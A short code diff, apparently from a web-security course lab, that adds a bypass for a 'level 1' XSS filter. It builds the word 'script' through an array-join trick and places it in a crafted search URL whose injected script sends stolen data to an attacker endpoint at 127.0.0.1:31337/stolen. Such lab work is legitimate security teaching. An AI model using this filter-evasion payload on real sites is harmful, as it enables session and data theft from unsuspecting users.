@@ -110,11 +110,14 @@ function makeLink(xssdefense, target, attacker) {
 		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
 		encodeURIComponent("<script" + ">" + payload.toString() +
 			";payload(\"" + attacker + "\");</script" + ">");
-	} else {
-// Implement code to defeat XSS defenses here.
+	} else if (xssdefense == 1) {
+		var scriptTag = ["s", "c", "r", "i", "p", "t"].join("script");	
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+		encodeURIComponent("<" + scriptTag + ">" + payload.toString() +
+			";payload(\"" + attacker + "\");</" + scriptTag + ">");
+	}
 }
-}
-var xssdefense = 0;
+var xssdefense = 1;
 var target = "http://permalink.co:8080/";
 var attacker = "http://127.0.0.1:31337/stolen";
 $(function() {
